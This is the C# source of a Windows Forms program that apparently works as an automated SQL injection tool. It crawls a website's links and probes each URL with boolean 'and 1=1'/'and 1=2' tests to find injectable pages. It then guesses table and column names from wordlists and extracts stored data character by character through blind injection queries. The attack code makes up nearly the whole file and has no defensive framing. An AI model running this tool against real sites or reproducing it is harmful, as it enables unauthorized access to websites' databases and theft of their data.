using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        string strCode;
        ArrayList alLinks = new ArrayList(), allinks = new ArrayList(), aLLinks = new ArrayList(), ALLinks = new ArrayList(), aLlinks = new ArrayList();
        public Form1()
        {
            InitializeComponent();
            StreamWriter writer1 = File.CreateText("url1.txt");
            writer1.Close();
            StreamWriter writer2 = File.CreateText("url2.txt");
            writer2.Close();
            StreamWriter writer3 = File.CreateText("可注入结点.txt");
            writer3.Close();
            StreamWriter writer4 = File.CreateText("表名.txt");
            writer4.Close();
            StreamWriter writer5 = File.CreateText("段名.txt");
            writer5.Close();
            StreamWriter writer6 = File.CreateText("段内容.txt");
            writer6.Close();
        }
        public static string Chr(int asciiCode)
        {
            System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding();
            byte[] byteArray = new byte[] { (byte)asciiCode };
            string strCharacter = asciiEncoding.GetString(byteArray);
            return (strCharacter);
        }
        public void pachongfajue()
        {
            int i, j;
            String pc = "";
            progressBar1.Maximum = 1000;
            progressBar1.Value = 0;
            for (i = 0; i < 10; i++)
            {
                try
                {
                    string url = alLinks[i].ToString();
                    string html = GetPageSource(url);
                    allinks = GetHyperLinks(html);
                    progressBar1.Value++;
                }
                catch
                {
                    progressBar1.Value++;
                    continue;
                }
                for (j = 0; j < allinks.Count; j++)
                {
                    try
                    {
                        alLinks.Add(allinks[j].ToString());
                    }
                    catch
                    {
                        continue;
                    }
                }
            }
            for (i = 0; i < 1000; i++)
            {
                try
                {
                    pc = alLinks[i].ToString();
                    pc += "\r\n";
                    textBox3.Text += alLinks[i].ToString();
                    textBox3.Text += "\r\n";
                    File.AppendAllText("url2.txt", pc);
                }
                catch
                {
                    continue;
                }
            }
            progressBar1.Value = progressBar1.Maximum;
            MessageBox.Show("检测结束!");
        }
        public void jczr()/*检测注入*/
        {
            int i, j;
            String code1, code2, code3, pc = "";
            progressBar1.Maximum = 1000;
            progressBar1.Value = 0;
            for (i = 0; i < 1000; i++)
            {
                try
                {
                    code1 = GetPageSource(alLinks[i].ToString());
                    code2 = GetPageSource(alLinks[i].ToString() + "and 1=1");
                    code3 = GetPageSource(alLinks[i].ToString() + "and 1=2");
                    if (code1 == code2 && code1 != code3)
                    {
                        if (!textBox6.Text.Contains(alLinks[i].ToString()))
                        {
                            pc = alLinks[i].ToString();
                            pc += "\r\n";
                            textBox6.Text += alLinks[i].ToString();
                            textBox6.Text += "\r\n";
                            File.AppendAllText("可注入结点.txt", pc);
                            aLLinks.Add(alLinks[i].ToString());
                        }
                    }
                    progressBar1.Value++;
                }
                catch
                {
                    try
                    {
                        progressBar1.Value++;
                    }
                    catch
                    {
                        continue;
                    }
                    continue;
                }
            }
            MessageBox.Show("检测注入结束!");
        }
        public void hqbm()/*获取表名*/
        {
            int i = 0, j, l;
            progressBar1.Value = 0;
            string biaoming = "", code1, code2, strURL = textBox8.Text;
            StreamReader reader = new StreamReader("tables.txt");
            biaoming = reader.ReadLine();
            while (biaoming != null)
            {
                try
                {
                    if (strURL.Substring(0, 7) != @"http://")
                    {
                        strURL = @"http://" + strURL;
                    }
                    code1 = GetPageSource(strURL);
                    code2 = GetPageSource(strURL + "and exists (select * from [" + biaoming + "])");
                    l = code1.Length - code2.Length;
                    if (l > -10 && l < 10)
                    {
                        for (j = 0; j < i; j++)
                        {
                            if (ALLinks[j].ToString() == ALLinks[i].ToString())
                                break;
                        }
                        if (j != i) continue;
                        ALLinks.Add(biaoming);
                        textBox4.Text += ALLinks[i].ToString();
                        textBox4.Text += "\r\n";
                        i++;
                    }
                }
                catch
                {
                    biaoming = reader.ReadLine();
                    continue;
                }
                biaoming = reader.ReadLine();
            }
            progressBar1.Value = progressBar1.Maximum;
            if (ALLinks.Count == 0)
                MessageBox.Show("表名均不可用!");
            File.AppendAllText("表名.txt", textBox4.Text);
        }
        public void hqdm()/*获取段名*/
        {
            int i, j = 0, k, l;
            string duanming = "", biaoming = "", code1, code2, strURL = textBox8.Text;
            progressBar1.Value = 0;
            StreamReader reader1 = new StreamReader("columns.txt");
            duanming = reader1.ReadLine();
            while (duanming != null)
            {
                try
                {
                    if (strURL.Substring(0, 7) != @"http://")
                    {
                        strURL = @"http://" + strURL;
                    }
                    code1 = GetPageSource(strURL);
                }
                catch
                {
                    continue;
                }
                for (k = 0; k < ALLinks.Count; k++)
                {
                    biaoming = ALLinks[k].ToString();
                    try
                    {
                        code2 = GetPageSource(strURL + "and exists (select top 1 [" + duanming + "] from [" + biaoming + "])");
                        l = code1.Length - code2.Length;
                        if (l > -10 && l < 10)
                        {
                            for (i = 0; i < aLlinks.Count; i++)
                            {
                                if (aLlinks[i].ToString() == duanming)
                                    break;
                            }
                            if (i != aLlinks.Count) continue;
                            aLlinks.Add(duanming);
                            textBox5.Text += aLlinks[j].ToString();
                            textBox5.Text += "\r\n";
                            j++;
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }
                duanming = reader1.ReadLine();
            }
            progressBar1.Value = progressBar1.Maximum;
            File.AppendAllText("段名.txt", textBox5.Text);
        }
        public void hqdnr()/*获取段内容*/
        {
            int i, j, k, l, m, n;
            String code1, code2, strURL = textBox8.Text;
            progressBar1.Value = 0;
            for (i = 0; i < aLlinks.Count; i++)
            {
                try
                {
                    if (strURL.Substring(0, 7) != @"http://")
                    {
                        strURL = @"http://" + strURL;
                    }
                    code1 = GetPageSource(strURL);
                }
                catch
                {
                    continue;
                }
                for (j = 0; j < ALLinks.Count; j++)
                {
                    try
                    {
                        code2 = GetPageSource(strURL + "and (select top 1 len(" + aLlinks[i].ToString() + ") from " + ALLinks[j].ToString() + ")>0");
                    }
                    catch
                    {
                        continue;
                    }
                    textBox7.Text += ALLinks[j].ToString() + ":" + aLlinks[i].ToString() + ":";
                    for (k = 1; ; k++)
                    {
                        try
                        {
                            code2 = GetPageSource(strURL + "and (select top 1 len(" + aLlinks[i].ToString() + ") from " + ALLinks[j].ToString() + ")>" + k);
                        }
                        catch
                        {
                            break;
                        }
                    }
                    for (l = 1; l <= k; l++)
                    {
                        for (m = 32; m <= 126; m++)
                        {
                            try
                            {
                                code2 = GetPageSource(strURL + "and (select top 1 asc(mid(" + aLlinks[i].ToString() + "," + l + ",1)) from " + ALLinks[j].ToString() + ")>" + m);
                            }
                            catch
                            {
                                break;
                            }
                        }
                        n = code1.Length - code2.Length;
                        if (n > -10 && n < 10)
                        {
                            textBox7.Text += Chr(m);
                            continue;
                        }
                    }
                    textBox7.Text += "\r\n";
                }
            }
            progressBar1.Value = progressBar1.Maximum;
            File.AppendAllText("段内容.txt", textBox7.Text);
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string strURL = textBox1.Text;
            if (strURL.Substring(0, 7) != @"http://")
            {
                strURL = @"http://" + strURL;
            }
            strCode = GetPageSource(strURL);
            alLinks = GetHyperLinks(strCode);
            progressBar1.Maximum = alLinks.Count;
            progressBar1.Value = 0;
            for (int i = 0; i < alLinks.Count; i++)
            {
                textBox2.Text += alLinks[i].ToString();
                textBox2.Text += "\r\n";
                progressBar1.Value++;
            }
            File.AppendAllText("url1.txt", textBox2.Text);
            MessageBox.Show("检测结束!");
        }
        static string GetPageSource(string URL)
        {
            Uri uri = new Uri(URL);
            HttpWebRequest hwReq = (HttpWebRequest)WebRequest.Create(uri);
            HttpWebResponse hwRes = (HttpWebResponse)hwReq.GetResponse();
            hwReq.Method = "Get";
            hwReq.KeepAlive = false;
            StreamReader reader = new StreamReader(hwRes.GetResponseStream(), System.Text.Encoding.GetEncoding("GB2312"));
            return reader.ReadToEnd();
        }
        static ArrayList GetHyperLinks(string htmlCode)
        {
            ArrayList al = new ArrayList();
            string strRegex = @"http://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?";
            Regex r = new Regex(strRegex, RegexOptions.IgnoreCase);
            MatchCollection m = r.Matches(htmlCode);
            for (int i = 0; i <= m.Count - 1; i++)
            {
                bool rep = false;
                string strNew = m[i].ToString();
                foreach (string str in al)
                {
                    if (strNew == str)
                    {
                        rep = true;
                        break;
                    }
                }
                if (!rep) al.Add(strNew);
            }
            al.Sort();
            return al;
        }
        private void button2_Click(object sender, EventArgs e)
        {
            int i;
            Thread[] threads = new Thread[50];
            for (i = 0; i < 1; i++)
            {
                CheckForIllegalCrossThreadCalls = false;
                Thread work = new Thread(new ThreadStart(pachongfajue));
                threads[i] = work;
                threads[i].Start();
            }
        }
        private void button3_Click(object sender, EventArgs e)
        {
            int i;
            Thread[] threads = new Thread[50];
            for (i = 0; i < 1; i++)
            {
                CheckForIllegalCrossThreadCalls = false;
                Thread work = new Thread(new ThreadStart(hqbm));
                threads[i] = work;
                threads[i].Start();
            }
        }
        private void button4_Click(object sender, EventArgs e)
        {
            int i;
            Thread[] threads = new Thread[50];
            for (i = 0; i < 1; i++)
            {
                CheckForIllegalCrossThreadCalls = false;
                Thread work = new Thread(new ThreadStart(hqdm));
                threads[i] = work;
                threads[i].Start();
            }
        }
        private void button5_Click(object sender, EventArgs e)
        {
            int i;
            Thread[] threads = new Thread[50];
            for (i = 0; i < 50; i++)
            {
                CheckForIllegalCrossThreadCalls = false;
                Thread work = new Thread(new ThreadStart(jczr));
                threads[i] = work;
                threads[i].Start();
            }
        }
        private void button6_Click(object sender, EventArgs e)
        {
            int i;
            Thread[] threads = new Thread[50];
            for (i = 0; i < 1; i++)
            {
                CheckForIllegalCrossThreadCalls = false;
                Thread work = new Thread(new ThreadStart(hqdnr));
                threads[i] = work;
                threads[i].Start();
            }
        }
        private void button7_Click(object sender, EventArgs e)
        {
            ProcessStartInfo psi = new ProcessStartInfo(@"自毁.txt");
            Process p = new Process();
            p.StartInfo = psi;
            p.Start();
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }
        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
